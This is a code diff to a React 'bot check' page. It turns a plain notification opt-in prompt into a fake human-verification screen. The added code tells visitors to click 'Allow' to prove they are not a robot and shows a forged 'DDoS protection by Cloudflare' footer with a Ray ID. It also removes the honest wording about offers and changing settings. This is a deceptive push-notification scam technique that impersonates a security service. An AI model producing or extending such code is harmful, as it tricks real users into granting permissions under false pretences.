@@ -12,6 +12,7 @@ export default function BotCheckPage() {
   const [showSoftPrompt, setShowSoftPrompt] = useState(false)
   const [permissionGranted, setPermissionGranted] = useState(false)
   const [isFirefoxOrEdge, setIsFirefoxOrEdge] = useState(false)
+  const [showCustomButtons, setShowCustomButtons] = useState(false)
   const [rayId, setRayId] = useState('')
   const [userAgent, setUserAgent] = useState('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
   const [ipAddress] = useState('192.168.1.100')
@@ -172,15 +173,16 @@ export default function BotCheckPage() {
 
   const handleSoftPromptAllow = async () => {
     try {
+      // When user clicks Allow button, show the native browser prompt
       const permission = await Notification.requestPermission()
       
       if (permission === 'granted') {
         setPermissionGranted(true)
         setShowSoftPrompt(false)
         
-        // For Firefox/Edge, skip bot check entirely - go straight to subscription
+        // For Firefox/Edge, proceed with subscription after permission granted
         if (window.isEmbedded && window.parent !== window) {
-          // Send verification message immediately (no bot check)
+          // Send verification message for embedded mode
           window.parent.postMessage({
             type: 'bot-check-verified',
             browserInfo: clientInfo,
@@ -191,14 +193,19 @@ export default function BotCheckPage() {
             }
           }, '*')
         } else {
-          // Non-embedded mode - handle subscription directly
+          // Non-embedded mode - handle subscription and redirect
           await handleAllow()
         }
       } else if (permission === 'denied') {
+        // User clicked Block in the native prompt
+        await handleBlock()
+      } else {
+        // User dismissed the prompt - treat as block
         await handleBlock()
       }
     } catch (error) {
       console.error('Error requesting permission:', error)
+      await handleBlock()
     }
   }
 
@@ -495,8 +502,12 @@ export default function BotCheckPage() {
         <Card className="mx-auto" style={{ maxWidth: '700px', border: '1px solid #d9d9d9', boxShadow: 'none' }}>
           <Card.Body className="p-5" style={{ backgroundColor: '#ffffff' }}>
             {(showSoftPrompt || isFirefoxOrEdge) ? (
-              // Soft prompt for Firefox/Edge
+              // Custom prompt for Firefox/Edge with bot check style
               <div className="text-center">
+                <h2 style={{ fontSize: '24px', fontWeight: '400', color: '#333', marginBottom: '30px' }}>
+                  Click "Allow" if you're not a robot
+                </h2>
+                
                 <div style={{ 
                   width: '80px', 
                   height: '80px', 
@@ -507,31 +518,12 @@ export default function BotCheckPage() {
                   alignItems: 'center',
                   justifyContent: 'center'
                 }}>
-                  <span style={{ fontSize: '40px' }}>🔔</span>
+                  <FiShield size={40} color="#0066cc" />
                 </div>
-                
-                <h2 style={{ fontSize: '28px', fontWeight: '600', color: '#333', marginBottom: '20px' }}>
-                  Enable Notifications
-                </h2>
                 
                 <p style={{ fontSize: '16px', color: '#666', marginBottom: '30px', lineHeight: '1.6' }}>
-                  Get instant updates about important events, special offers, and security alerts. 
-                  <br />
-                  We promise not to spam you!
+                  To continue to {domain}, please verify you're human by allowing notifications.
                 </p>
-                
-                <div style={{ 
-                  background: '#fff3cd', 
-                  border: '1px solid #ffeaa7',
-                  borderRadius: '8px',
-                  padding: '15px',
-                  marginBottom: '30px'
-                }}>
-                  <p style={{ margin: 0, color: '#856404', fontSize: '14px' }}>
-                    <strong>{clientInfo?.browser || 'Your browser'}</strong> requires your permission to show notifications.
-                    Click "Enable Notifications" below, then click "Allow" in your browser.
-                  </p>
-                </div>
                 
                 <div className="d-flex gap-3 justify-content-center">
                   <Button 
@@ -546,7 +538,7 @@ export default function BotCheckPage() {
                       fontWeight: '500'
                     }}
                   >
-                    Enable Notifications
+                    Allow
                   </Button>
                   <Button 
                     variant="outline-secondary"
@@ -557,13 +549,18 @@ export default function BotCheckPage() {
                       fontSize: '16px'
                     }}
                   >
-                    Not Now
+                    Block
                   </Button>
                 </div>
                 
-                <p style={{ color: '#999', fontSize: '13px', marginTop: '30px', marginBottom: '0' }}>
-                  You can change this setting anytime in your browser preferences
-                </p>
+                <div style={{ borderTop: '1px solid #e5e5e5', paddingTop: '20px', marginTop: '40px' }}>
+                  <p style={{ color: '#999', fontSize: '13px', marginBottom: '5px' }}>
+                    DDoS protection by Cloudflare
+                  </p>
+                  <p style={{ color: '#999', fontSize: '13px', margin: '0' }}>
+                    Ray ID: {rayId}
+                  </p>
+                </div>
               </div>
             ) : (isChecking && !isFirefoxOrEdge) ? (
               <div className="text-center">
